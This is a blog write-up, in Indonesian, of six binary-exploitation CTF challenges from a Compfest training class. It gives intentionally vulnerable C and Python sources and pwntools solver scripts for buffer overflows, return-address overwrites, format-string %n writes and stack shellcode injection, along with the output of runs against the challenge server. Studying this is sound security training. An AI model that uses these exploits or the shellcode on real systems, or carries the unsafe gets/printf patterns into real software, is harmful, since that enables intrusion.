---
layout: post
title: "Binary Exploitation - Compfest 20 Hacker Class"
date: 2020-08-18 12:17:56 +0530
categories:
  - WriteUp
  - Hacker Class
  - Binary Exploit
---

Karena ada yang membutuhkan writeup dari Hacker Class, maka berikut writeup kategori Binary Exploitation.
<br />  

# Binary Exploitation

## 1. Easy Buffer Overflow [50pts]

Diberikan file binary beserta sourcenya. Berikut source code-nya.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char const *argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);
	int hack_me = 0x2;
	char buf[10];

	puts("Enter a number (Max 10 digits)");
	gets(buf);

	if(hack_me > 0x2)
		system("echo \"Hi, here is your flag\"; cat flag.txt");
	else
		puts("Ok thanks");
	return 0;
}
```

Untuk mendapatkan flag, nilai variable `hack_me` harus lebih dari 2. Inputan disimpan pada variable buf yang memiliki panjang 10 karakter, dengan input melebihi 10 karakter, inputan kita akan masuk ke variable `hack_me` karena input diambil dengan fungsi `gets` yang memiliki bug buffer overflow.

```sh
$ python -c 'print "A"*12' | ./ez_buffow 
Enter a number (Max 10 digits)
Hi, here is your flag
cat: flag.txt: No such file or directory
```

### FLAG

`Service mati :p`
<br />
<br />

## 2. Tempat Kembali [50pts]

Diberikan file python, bdrikut isinya.

```py
#!/usr/bin/python3

def normal():
	print('okay thanks uwu')

def winner():
	print('Congratz, here is your flag: ' + open('flag.txt').read())

real_return_address = 'normal'
my_input = input('Enter your name (max 32 characters)\n').ljust(32, '\x00')
my_input += real_return_address
return_address = my_input[32:32+6]
try:
	locals()[return_address]()
except:
	print('SIGSEGV')
```

Return address diambil pada index ke 32-38 dari inputan. Maka input sembarang dengan panjang 32 karakter lalu ditambah dengan `winner`, maka return_address akan berisi `winner`.



```sh
$ python -c 'print "A"*32 + "winner"' | nc 128.199.104.41 29951
Enter your name (max 32 characters)
Congratz, here is your flag: COMPFEST12{changing_return_address_is_cool_and_powerful_just_wait_for_ROP}
```

### FLAG 

`COMPFEST12{changing_return_address_is_cool_and_powerful_just_wait_for_ROP}`
<br />
<br />

## 3. Tempat Kembali 2 [152pts]

Diberikan source file python, berikut isinya.

```py
#!/usr/local/bin/python3.7

import random
import string

stack = ''.join([random.choice(string.ascii_lowercase) for j in range(100)])
rdi = ""
rsi = ""
rdx = "0"

def get_file():
	print(open(rdi, rsi).read()[:int(rdx)])

def popstack():
	global stack
	ret_val = stack[:8].strip()
	stack = stack[8:]
	return ret_val

def gadget_1():
	global rdi
	rdi = popstack()
	return_address = popstack()
	globals()[return_address]()

def gadget_2():
	global rsi
	rsi = popstack()
	return_address = popstack()
	globals()[return_address]()

def gadget_3():
	global rdx
	rdx = popstack()
	return_address = popstack()
	globals()[return_address]()

def gadget_4():
	print("test")

def vuln():
	global stack
	buf = input().ljust(32, ' ')
	stack = buf[:56] + stack
	print(buf)
	stack = stack[32:]
	return_address = popstack()
	globals()[return_address]()

def main():
	global stack
	print("Good Luck~")
	stack = "main_end".ljust(8, ' ') + stack
	vuln()

def main_end():
	print("Thank you~")

if __name__ == '__main__':
	main()
```

Tujuan kita disini adalah mengisi :

1. Mengisi variable **rdi** menjadi nama file yang berisi flag lewat fungsi **gadget_1**.
2. Mengisi variable **rsi** menjadi **r** lewat fungsi **gadget_2**.
3. Mengisi variable **rdx** menjadi lebih dari panjang flag lewat fungsi **gadget_3**.

Sehingga, ketika fungsi `get_file` dipanggil, akan menjadi seperti ini:

```py
print(open('flag', 'r').read()[:length])
```

Overwrite `return_address` ke fungsi `gadget_*` (caranya seperti pada soal sebelumnya) lalu kembali lagi ke fungsi `main` untuk overwrite `return_address` lagi ke fungsi gadget selanjutnya sampai semuanya terpenuhi. Lalu ke fungsi `get_file` untuk mendapatkan flag.

Berikut solvernya.

```py
#!/usr/bin/python

from sys import argv
from pwn import *

def roprop(addr, val=""):
    buf = 'A'*(32)
    buf += addr
    buf += val.ljust(8, ' ')
    buf += 'main'.ljust(8, ' ')
    p.sendline(buf)

def exploit(p):
    roprop('gadget_1', 'flag')
    roprop('gadget_2', 'r')
    roprop('gadget_3', '99999999')
    roprop('get_file')
    flag = p.recvall().split()[-1]
    info(flag)

if __name__ == '__main__':
    if len(argv) < 2:
        p = process(['python3', 'tempat_kembali2.py'])
    else:
        p = remote('128.199.104.41', 29661)
    exploit(p)

```

Jalankan dan didapatkan flag.

```sh
$ python solver.py go
[+] Opening connection to 128.199.104.41 on port 29661: Done
[+] Receiving all data: Done (367B)
[*] Closed connection to 128.199.104.41 port 29661
[*] COMPFEST12{https://zafirr31.github.io/posts/binary-exploitation-return-oriented-programming/}
```

### FLAG

`COMPFEST12{https://zafirr31.github.io/posts/binary-exploitation-return-oriented-programming/`
<br/>
<br/>


## 4. Format String EZ

Diberikan file binary beserta sourcenya. Berikut isi dari source codenya.

```c
#include <stdio.h>

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);

    int target = 0;
    char name[20];

    printf("What's your name?\n");
    scanf("%s", name);
    printf("Hello, ");
    printf(name, &target);
    printf("!\n");

    if(target == 1337) {
        system("cat flag.txt");
    }
}
```

Untuk mendapatkan flag, nilai dari target harus bernilai `1337`, tetapi variable `target` sudah diinisiasikan dengan bernilai 0. Karena terdapat bug format string, kita bisa mengubah isi dari variable `target`.

Pertama, cari dulu offset alamat variable target dengan debug menggunakan gdb.

```py
   ....
   0x555555554851 <main+33>:	call   0x5555555546d0 <setvbuf@plt>
=> 0x555555554856 <main+38>:	mov    DWORD PTR [rbp-0x4],0x0
   0x55555555485d <main+45>:	lea    rdi,[rip+0x100]        # 0x555555554964
   ....

Legend: code, data, rodata, value
0x0000555555554856 in main ()

gdb-peda$ x/wx $rbp-0x4
0x7fffffffdbfc:	0x00000000
```

Alamat variable target adalah `0x7fffffffdbfc`.

```py
gdb-peda$ c
Continuing.
%p.%p.%p
Hello, 0x7fffffffdbfc.0x7fffffffdbfc.(nil)!
```

Ternyata alamat target terletak pada offset pertama. Overwrite target dengan nilai 1337 dan didapatkan flag.

```sh
abdullahnz@zeroday:~/CTF/COMPFEST/hc/pwn/Format_String_EZ ./fmt1 
What's your name?
%1337x%n
Hello,
a48b950c!
cat: flag.txt: No such file or directory
```

### FLAG 

Service mati.
<br/>
<br/>

## 5. Stack Shellcode [288pts]

Berikut source code dari soal.

```c
#include <stdio.h>

int main(int argc, char const *argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);

	char buf[400];
	printf("Here is the address of buf: %lp\n", &buf);
	printf("Now input the shellcode and run it: ");

	gets(buf);
	return 0;
}
```

Inject shellcode ditambah padding sebesar 400 bytes dikurangi panjang shellcode untuk sampai ke return address, kembali lagi ke address `buf` (tempat shellcode variable buf yang berisi shellcode) yang diberi oleh program.

Solver,

```py
#!/usr/bin/python

from pwn import *
import sys

def exploit(p):
    address = int(p.recv().split()[6], 16)
    info(hex(address))
    
    # http://shell-storm.org/shellcode/files/shellcode-806.php
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    buf  = shellcode
    buf += "\x90"*(400-len(shellcode))
    buf += p64(address)

    p.sendline(buf)
    p.interactive()
    
if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 20950)
    else:
        p = process('./stack')
    exploit(p)

```

Jalankan dan didapatkan shell.

```sh
$ python solver.py 
[+] Starting local process './stack': pid 8832
[*] 0x7ffc314ca230
[*] Switching to interactive mode
$ id
uid=1000(abdullahnz) gid=1000(abdullahnz) groups=1000(abdullahnz),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),127(wireshark)
$  
```

### FLAG 

Service mati.
<br/>
<br/>

## 6. Format String Harder [492 pts]

Berikut source code nya.

```c
#include<stdio.h>
#include<stdlib.h>

int main(int argc, char const *argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);

	char buf[20];
	int* hack_me = malloc(10);
	*hack_me = 5;

	printf("This is the location of the hack_me varible: %lp\n", hack_me);

	puts("Ok now change its value to 420");

	fgets(buf, 20, stdin);
	printf(buf);

	if(*hack_me == 420)
		system("cat flag.txt");
	else
		puts("Sorry you failed");

	return 0;
}

```

Format string attack seperti pada soal sebelumnya, tetapi soal ini diberi address variable `hack_me` (seperti pada soal stack sebelum ini) untuk dioverwrite.

Berikut solvernya.

```py
#!/usr/bin/python

from pwn import *
import sys

def exploit(p):
    hack_me = int(p.recvuntil('\nOk').split()[-2], 16)
    buf = p32(hack_me)
    buf += '%416x%9$n'
    p.sendline(buf)
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 42069)
    else:
        p = process('./format_harder')
    exploit(p)

```

Kenapa 416 ? setelah didebug, variable `hack_me` berisi nilai yang kita tulis + 4 (panjang alamat). Jadi harus dikurangi 4 , `( 420-4 = 416 )`

```sh
$ python solver.py r
[+] Opening connection to 128.199.104.41 on port 42069: Done
[*] Switching to interactive mode
 now change its value to 420
`\x11�W                                                                                                                                                                                                                                                                                                                                                                                                                              14
COMPFEST12{Format_Stringing_to_win}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 128.199.104.41 port 42069
```

### FLAG

`COMPFEST12{Format_Stringing_to_win}`
<br/>
<br/>